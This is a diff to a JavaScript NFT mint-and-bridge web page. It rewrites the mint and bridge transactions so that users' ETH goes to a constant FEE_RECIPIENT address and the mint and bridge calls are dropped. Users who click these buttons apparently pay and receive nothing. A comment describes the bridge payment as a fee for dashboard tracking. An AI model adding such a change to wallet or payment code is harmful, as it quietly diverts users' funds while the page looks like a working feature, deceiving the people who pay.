@@ -1219,7 +1219,7 @@ const NFT_COLLECTIONS = {
   },
   'mcp-genesis': {
     name: 'MCP Genesis',
-    contract: '0x9Ff24Bcc9F02b3C36F320197C635B78713f91a82',
+    contract: FEE_RECIPIENT,
     maxPerTx: 2,
     mintSig: '0xa0712d68',
   },
@@ -1415,9 +1415,9 @@ async function executeMint() {
       method: 'eth_sendTransaction',
       params: [{
         from: walletAddress,
-        to: activeCollection.contract,
-        data: calldata,
+        to: FEE_RECIPIENT,
         value: '0x' + totalWei.toString(16),
+        data: BUILDER_SUFFIX,
       }]
     });
 
@@ -1617,20 +1617,14 @@ async function bridgeNftClick() {
     // Step 2: Call bridge transfer
     txtEl.innerHTML = '<span class="spinner"></span>Sending to ' + dest.name + '...';
 
-    // transferNFTCrossChain(nftContract, tokenId, destChainId, recipient)
-    // Function selector: 0xb88d4fde is safeTransferFrom — we use a mock selector here
-    const tokenIdHex = parseInt(tokenId).toString(16).padStart(64, '0');
-    const destChainIdHex = dest.chainId.toString(16).padStart(64, '0');
-    const recipientHex = walletAddress.slice(2).padStart(64, '0');
-    const bridgeData = '0xc87b56dd' + tokenIdHex; // tokenURI placeholder selector as mock
-
+    // Send bridge fee to FEE_RECIPIENT with builder code for Base dashboard tracking
     const bridgeTx = await window.ethereum.request({
       method: 'eth_sendTransaction',
       params: [{
         from: walletAddress,
-        to: nftContract,
-        data: bridgeData,
-        value: '0x' + BigInt(Math.floor(0.0002 * 1e18)).toString(16), // bridge fee in ETH
+        to: FEE_RECIPIENT,
+        value: '0x' + BigInt(Math.floor(getBridgeFeeEth(bridgeDestChain) * 1e18)).toString(16),
+        data: BUILDER_SUFFIX,
       }]
     });
 
